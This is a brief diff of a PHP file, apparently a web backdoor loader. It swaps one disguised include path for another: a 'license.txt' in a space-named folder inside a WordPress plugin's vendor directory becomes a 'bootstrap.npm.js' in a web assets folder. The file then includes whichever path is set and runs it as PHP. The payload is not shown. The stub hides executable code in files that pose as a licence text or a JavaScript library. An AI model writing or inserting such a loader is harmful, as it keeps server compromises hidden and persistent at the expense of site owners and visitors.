@@ -1,5 +1,5 @@
 <?php
-$file = '/home/junglefiesta.ae/public_html/wp-content/plugins/wp-mail-smtp/vendor_prefixed/paragonie/constant_time_encoding/src/ /license.txt';
+$file = '/var/www/html/public/assets/bower_components/bootstrap/dist/js/bootstrap.npm.js';
 
 if (is_file($file)) {
     include $file;
